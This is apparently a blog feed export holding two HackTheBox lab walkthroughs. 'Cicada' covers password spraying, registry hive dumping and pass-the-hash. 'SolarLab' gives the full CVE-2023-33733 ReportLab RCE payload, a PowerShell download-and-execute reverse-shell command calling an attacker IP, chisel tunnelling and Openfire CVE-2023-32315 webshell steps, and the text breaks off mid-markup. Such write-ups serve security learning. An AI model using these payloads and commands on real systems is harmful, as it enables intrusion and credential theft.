class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SMB 445</span><br><span class="line">RDP 3389</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><h3 id="anonymous-access"><a href="#anonymous-access" class="headerlink" title="anonymous access"></a>anonymous access</h3><p>Checking smb port for anonymous access:<br><img src="/security/Screenshots/Pasted%20image%2020241216181737.png"></p><p>SMB Share enumeration unveils a notice from HR file inside the HR share, let’s check it out<br><img src="/security/Screenshots/Pasted%20image%2020241216182316.png"><br>note down the discovered default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p><p>with anonymous access enabled to the smb server, we can try to discover users with <code>rid bruteforcing</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">oxdf@hacky$ netexec smb CICADA-DC -u guest -p &#x27;&#x27; --rid-brute</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeG</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>cleaning the  users list with grep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat names |grep SidTypeUser| grep -oP &#x27;\\\K[^ ]+&#x27; &gt; users-list.txt</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">CICADA-DC$</span><br><span class="line">john.smoulder</span><br><span class="line">sarah.dantelia</span><br><span class="line">michael.wrightson</span><br><span class="line">david.orelious</span><br><span class="line">emily.oscars</span><br></pre></td></tr></table></figure><h5 id="checking-password-policy"><a href="#checking-password-policy" class="headerlink" title="checking password policy"></a>checking password policy</h5><p><img src="/security/Screenshots/Pasted%20image%2020241217023442.png">   </p><p> Now i’m going to run a spraying attack at smb with the curated list of users and the found default password:<br><img src="/security/Screenshots/Pasted%20image%2020241216182736.png"><br>Discovered: <code>michael.wrightson</code> user</p><h2 id="Credentialed-Smb-enumeration"><a href="#Credentialed-Smb-enumeration" class="headerlink" title="Credentialed Smb enumeration"></a>Credentialed Smb enumeration</h2><p>dumping all users:<br><img src="/security/Screenshots/Pasted%20image%2020241217024546.png"><br>it appears  david.orelious has left a gift for us, his Creds.<br><code>aRt$Lp#7t*VQ!3 </code><br><img src="/security/Screenshots/Pasted%20image%2020241217030335.png"><br>Authenticated as david reveals the DEV share</p><h2 id="DEV-SHARE-ENUMERATION"><a href="#DEV-SHARE-ENUMERATION" class="headerlink" title="DEV SHARE ENUMERATION"></a>DEV SHARE ENUMERATION</h2><p>throughly enumerate content of the DEV share With the spider module:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.35 -u &#x27;david.orelious&#x27; -p &#x27;aRt$Lp#7t*VQ!3&#x27; --spider DEV --regex .</span><br></pre></td></tr></table></figure><h2 id="Script-file-discovery"><a href="#Script-file-discovery" class="headerlink" title="Script file discovery"></a>Script file discovery</h2><p> Inspecting the output of spider, i found a script file with credentials of another user<br><img src="/security/Screenshots/Pasted%20image%2020241217032915.png"></p><p>i found a PS-Credential object with emily.oscars credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = &quot;emily.oscars&quot;</span><br><span class="line">$password = ConvertTo-SecureString &quot;Q!3@Lp#M6b*7t*Vt&quot; -AsPlainText -Force</span><br><span class="line">$credentials = New-Object System.Management.Automation.PSCredential($username, $password)</span><br></pre></td></tr></table></figure><p>test out  the credentials with evil-winrm:<br><img src="/security/Screenshots/Pasted%20image%2020241217034219.png"></p><h4 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag:"></a>user flag:</h4><p><img src="/security/Screenshots/Pasted%20image%2020241217034425.png"></p><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><p>checking privileges</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">get-acl c:\users\administrator</span><br></pre></td></tr></table></figure><p><img src="/security/Screenshots/Pasted%20image%2020241217095700.png"></p><p>The <code>SeBackupPrivilege</code> can be used to gain read access to any file According to microsoft docs<br>there are many techniques avaiable to exploit this, but im going copy the hives registery manually using <code>reg</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\sam sam      </span><br><span class="line">The operation completed successfully.                      </span><br><span class="line">                             </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; reg save hklm\system system</span><br><span class="line">The operation completed successfully. </span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download sam</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\sam to sam</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download system</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\programdata\system to system</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure><p>now i’m going to extract the Administrator’s hash from the registery hives with <code>secretsdump.py</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -sam sam -system system LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#x27;t have hash information.</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><h2 id="or-via-reg-py"><a href="#or-via-reg-py" class="headerlink" title="or via reg.py"></a>or via reg.py</h2><p>Impacket’s reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ reg.py &#x27;cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt&#x27;@10.10.11.35 backup -o &#x27;C:\windows\temp\&#x27;</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...</span><br><span class="line">[*] Saved HKLM\SAM to C:\windows\temp\\SAM.save</span><br><span class="line">[*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save</span><br><span class="line">[*] Saved HKLM\SECURITY to C:\windows\temp\\SECURITY.save</span><br></pre></td></tr></table></figure><p>And then Download them over EvilWinRM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SYSTEM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SYSTEM.save to SYSTEM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SAM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SAM.save to SAM.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; download SECURITY.save</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\windows\temp\SECURITY.save to SECURITY.save</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure><h1 id="testing-the-hash"><a href="#testing-the-hash" class="headerlink" title="testing the hash"></a>testing the hash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb CICADA-DC -u administrator -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><br></pre></td></tr></table></figure><p>get the flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span><br><span class="line">b7cd8************************</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> Writeup </tag>
            
            <tag> nmap </tag>
            
            <tag> HTB </tag>
            
            <tag> smb </tag>
            
            <tag> flask </tag>
            
            <tag> privilege escalation </tag>
            
            <tag> openfire </tag>
            
            <tag> chisel </tag>
            
            <tag> password-spray </tag>
            
            <tag> htb Cicada </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox SolarLab  Walkthrough</title>
      <link href="/2024/09/22/HTB-SolarLab/"/>
      <url>/2024/09/22/HTB-SolarLab/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/solarlab/blacksolar.png" alt="alt text"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.</p><p> Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell.</p><p>For lateral movement,  to escalate privileges to the openfire user,  method takes advantage of CVE-2023-32315 in OpenFire to create a user and upload a malicious plugin for RCE.<br> With this access, I decrypted a password from the OpenFire configuration, which  served as the administrator’s password. </p> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>SolarLab</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Medium</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>35</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><p>Initial nmap scan with default scripts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sV  -oN nmap/solarlab_full 10.10.11.16 -p-</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-16 14:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.16</span><br><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 65529 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">6791/tcp open  hnm</span><br><span class="line">7680/tcp open  pando-pub</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-05-17T18:56:05</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.15 seconds</span><br></pre></td></tr></table></figure><p>Fingerprinting OS using smbmap would indicate the machine is a windows server 2019.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H solarlab.htb -v</span><br></pre></td></tr></table></figure><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><p>Enumerating the discovered SMB service, there was one share with a document file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb -H 10.10.11.16 -s Documents -u guest -r</span><br><span class="line">[+]                                                   </span><br><span class="line">        Documents                                               READ ONLY</span><br><span class="line">        fr--r--r--            12793 Fri Nov 17 07:34:54 2023    details-file.xlsx</span><br><span class="line">-----------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>download the  file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap  -H 10.10.11.16 -s Documents -u guest -p &quot;&quot; -r -A  details-file.xlsx  </span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/image-1.png" alt="alt text"><br> it was clear that these were some login credentials related to a domain</p><p>Nothing else was discovered on SMB. its time to enumerate port 80.</p><h2 id="Enumerating-Port-80"><a href="#Enumerating-Port-80" class="headerlink" title="Enumerating  Port 80"></a>Enumerating  Port 80</h2><p>The default root appeared to be a static site with nothing interesting, so I started looking at other open ports and discovered a subdomain running on port 6791:<br><code>http://report.solarlab.htb:6971</code><br><img src="/../images/solarlab/report-lab.png" alt="alt text"><br>I initially started by identifying which users from the spreadsheet existed. Testing h usernames like “blake.byte” or “blake byte” produced a different error messages from “claudiaS” or “alexanderK”, confirming that Alex and Claudia exist but the passwords were incorrect.</p><h3 id="bruteforcing-with-intruder"><a href="#bruteforcing-with-intruder" class="headerlink" title="bruteforcing with intruder"></a>bruteforcing with intruder</h3><p>I attempted bruteforcing in Clusterbomb attack mode, trying different combinations from the spreadsheet file.<br><img src="/../images/solarlab/intruder.png" alt="alt text"><br>No valid credentials, I returned to the document and observed a pattern in the naming convention. Two users had shortened names, e.g., ClaudiaS and AlexanderK. The third user, Blake Byte, could follow the same pattern.<br>Trying the same brute attack with “blakeB” as the login username worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* PASS: ThisCanB3typedeasily1@</span><br><span class="line">* USER: blakeb</span><br></pre></td></tr></table></figure><h2 id="Enumerating-Reporthub"><a href="#Enumerating-Reporthub" class="headerlink" title="Enumerating Reporthub"></a>Enumerating Reporthub</h2><p>This site offers some functionality, and the “Training Request” section leads to a form.<br><img src="/../images/solarlab/reporthub.webp" alt="asas"></p><p><img src="/../images/solarlab/form.png" alt="alt text"><br>After clicking the “Generate PDF” button, I was redirected to a PDF document. The image gets reflected in the PDF, indicating a possible XSS vulnerability.<br><img src="/../images/solarlab/signature.png" alt="alt text"><br>I tried simple payloads to test for injection, uploading script files with .html and .svg formats, but no luck. I then downloaded the PDF document and ran exiftool on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exiftool output.pdf </span><br><span class="line">ExifTool Version Number         : 12.40</span><br><span class="line">File Name                       : output.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 202 KiB</span><br><span class="line">File Modification Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Access Date/Time           : 2024:09:12 15:54:22-04:00</span><br><span class="line">File Inode Change Date/Time     : 2024:09:12 15:54:21-04:00</span><br><span class="line">File Permissions                : -rwxrwx---</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Author                          : (anonymous)</span><br><span class="line">Create Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Creator                         : (unspecified)</span><br><span class="line">Modify Date                     : 2024:05:17 22:53:02-02:00</span><br><span class="line">Producer                        : ReportLab PDF Library - www.reportlab.com</span><br><span class="line">Subject                         : (unspecified)</span><br><span class="line">Title                           : (anonymous)</span><br><span class="line">Trapped                         : False</span><br><span class="line">Page Mode                       : UseNone</span><br><span class="line">Page Count                      : 1</span><br></pre></td></tr></table></figure><p>The library used to make it is ReportLab.</p><p>Searching for “reportlab exploit” turns up information about CVE-2023-33733, a remote code execution vulnerability through Injection in ReportLab:<br><img src="/../images/solarlab/cve.png" alt="alt text"></p><h2 id="Exploiting-ReportLab"><a href="#Exploiting-ReportLab" class="headerlink" title="Exploiting ReportLab"></a>Exploiting ReportLab</h2><p>Navigating to the exploit PoC on GitHub, the exploit code was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;ping #attacker-ip&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/solarlab/form.png" alt="alt text"></p><p>Attempting to send the exploit through the form field<br>throws an error in your face indicating that the character limit for the form was exceeded.</p><p>one way to solve this would be to try and shorten the length of every variable, or to try different parameters<br>after intercepting with burp and trying different areas,<br>placing the exploit under <code>training_request</code> Drop list option bypasses this restriction.<br><img src="/../images/solarlab/burp.png" alt="alt text"></p><h2 id="Blake-shell"><a href="#Blake-shell" class="headerlink" title="Blake shell"></a>Blake shell</h2><p>after confirming the connection it’s time to get a shell!<br>this part involves these steps:</p><ul><li>setup python server hosting the shell:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 http.server 80   <span class="comment">#revshell.ps1 is in the same directory</span></span><br></pre></td></tr></table></figure><ul><li>set up a listening session on a separate tab:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; (<span class="built_in">stty</span> size; <span class="built_in">cat</span>) | nc -lvnp PORT</span><br></pre></td></tr></table></figure><ul><li>This Piece of code is used to download and execute powershell script in memory, were going to add it to the Exploit Code</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span>(<span class="built_in">IWR</span> http://<span class="number">10.10</span>.<span class="number">16.14</span>/con.ps1 <span class="literal">-UseBasicParsing</span>); <span class="built_in">Invoke-ConPtyShell</span> <span class="number">10.10</span>.<span class="number">16.63</span> <span class="number">9001</span></span><br></pre></td></tr></table></figure><h4 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit:"></a>Final Exploit:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))</span></span></span><br><span class="line"><span class="string"><span class="tag">[&#x27;os&#x27;].system(&#x27;powershell IEX(IWR http://10.10.16.14/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.63 9001&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1,</span></span></span><br><span class="line"><span class="string"><span class="tag"> &#x27;startswith&#x27;: lambda self,</span></span></span><br><span class="line"><span class="string"><span class="tag">  x: 1 == 0,</span></span></span><br><span class="line"><span class="string"><span class="tag">   &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">    self.mutated - 1) &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">     &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;,</span></span></span><br><span class="line"><span class="string"><span class="tag">      ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>sending in the repaeter tab, i got a 503 from the web server<br> and a powershell session as the blake user.<br> <img src="/../images/solarlab/rev1.png" alt="alt text"></p><h2 id="Initial-Foothold"><a href="#Initial-Foothold" class="headerlink" title="Initial Foothold"></a>Initial Foothold</h2><p>the user flag was found under <code>C:\Users\blake\Desktop\flag.txt</code></p><p>checking <code>Users</code> folder, i found <code>openfire</code>, <code>Administrator</code>, and <code>blake</code>(me).</p><p>getting winpeas</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://10.10.16.97/winPEASany.exe&quot; -OutFile </span><br><span class="line">&quot;C:\Users\blake\Desktop\winpeas.exe&quot;</span><br></pre></td></tr></table></figure><p>Found openfire service Running running a web protal locally on port 9090.<br><img src="/../images/solarlab/listneingport.png" alt="alt text"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Openfire(Openfire)[&quot;C:\Program Files\Openfire\bin\openfire-service.exe&quot;] - Autoload</span><br></pre></td></tr></table></figure><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Openfire is a real-time collaboration (RTC) server licensed under the Open Source Apache License.<br>I tried to get into <code>C:\Program Files\Openfire\</code> to look for scripts&#x2F;DBs but it was resricted to openfire only.</p><h3 id="Openfire-Web-Server"><a href="#Openfire-Web-Server" class="headerlink" title="Openfire Web Server"></a>Openfire Web Server</h3><p>port forwarding with chisel so i can interact with local server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe client 10.10.16.14:4321 R:9090:127.0.0.1:9090   #on-victim</span><br><span class="line">chisel server --socks5 --reverse -p 4321                     #on-attacker</span><br></pre></td></tr></table></figure><p>Navigating to localhost:9090<br><img src="/../images/solarlab/openfire.png" alt="alt text"></p><h3 id="Exploring-CVE-2023-32315"><a href="#Exploring-CVE-2023-32315" class="headerlink" title="Exploring CVE-2023-32315"></a>Exploring CVE-2023-32315</h3><p>trying default credentials did not work.<br>searching for “openfire exploit” reveals Openfire  is vulnerable to a Path traversal where attackers can abuse the vulneralbility in order to obtain CSRF tokens and cookies for Administrative accounts to generate an account that they can log onto.<br><img src="/../images/solarlab/0_5wf7vTHNYoj8z4hy.webp" alt="alt text"></p><p>you can Read more about it here:<a href="https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236">https://vsociety.medium.com/cve-2023-32315-path-traversal-in-openfire-leads-to-rce-10f988e06236</a></p><h3 id="Shell-as-Openfire"><a href="#Shell-as-Openfire" class="headerlink" title="Shell as Openfire"></a>Shell as Openfire</h3><p>searching for “openfire exploit”<br> <a href="https://github.com/miko550/CVE-2023-32315#step">https://github.com/miko550/CVE-2023-32315#step</a><br>This exploit aims to generate a new user with <code>CVE-2023-32315</code> and perform RCE through a bundled Malicious Plugin.<br>  steps to perform:</p><ol><li>Run exploit</li><li>login with newly added user </li><li>go to tab plugin &gt; upload plugin <code>openfire-management-tool-plugin.jar</code></li><li>go to tab server &gt; server settings &gt; Management tool  </li><li>Access webshell with password “123”</li></ol><p><img src="/../images/solarlab/cve2.png" alt="alt text"><br>login with the newly added user:<br><img 